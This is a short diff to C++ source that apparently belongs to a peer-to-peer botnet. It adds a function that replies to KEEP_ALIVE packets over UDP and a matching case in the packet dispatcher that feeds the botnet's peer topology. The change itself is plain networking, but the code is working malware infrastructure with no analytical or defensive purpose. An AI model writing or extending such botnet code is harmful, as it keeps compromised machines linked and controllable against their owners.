@@ -161,6 +161,19 @@ static void handle_command_result(u_char* const data)
 	src_peer.sin_addr.s_addr = addr.ip;
 }
 
+static void keep_alive_reply(struct sockaddr_in& client)
+{
+	/* locals */
+	struct botnet_pack pack;
+	
+	/* create keep_alive reply */
+	memset(&pack, 0, BOTNET_PACK_SIZE);
+	pack.type = KEEP_ALIVE_ACK;
+
+	/* send to client */
+	sendto(udp_sock, (char*)&pack, BOTNET_PACK_SIZE, 0, (struct sockaddr*)&client, sizeof(client));
+}
+
 static int handle_udp_connections()
 {
 	/* locals */
@@ -188,6 +201,9 @@ static int handle_udp_connections()
 		sync_reply(client);
 		break;
 	case PACK_TYPE::SYNC_REPLY:
+		break;
+	case PACK_TYPE::KEEP_ALIVE:
+		keep_alive_reply(client);
 		break;
 	case PACK_TYPE::PEER_REPLY:
 		botnet_topology.addPeer(data, udp_sock);
